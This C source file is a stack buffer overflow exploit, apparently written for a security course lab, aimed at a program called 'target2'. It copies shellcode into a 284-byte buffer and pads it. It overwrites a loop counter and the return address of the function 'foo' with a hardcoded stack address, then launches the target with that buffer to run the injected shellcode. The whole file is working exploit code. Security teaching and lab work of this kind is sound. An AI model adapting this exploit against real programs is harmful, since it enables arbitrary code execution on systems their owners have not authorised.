#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];


        char large_string[284];
        int i;
        for(i = 0; i < strlen(shellcode); i++){
                large_string[i] = shellcode[i];
        }
        for(i = strlen(shellcode); i < 280; i++){
                large_string[i] = '0';
        }

	// overwrite "i" bytes of target2
	large_string[264] = '\x17';
	large_string[265] = '\x01';
    
	// overwrite return address of 'foo' of target2, to be the start address of buf
        large_string[280] = '\x40';
        large_string[281] = '\xfd';
        large_string[282] = '\x21';
        large_string[283] = '\x20';
    
        args[0] = TARGET;
        args[1] = large_string;
        args[2] = NULL;
    
        env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
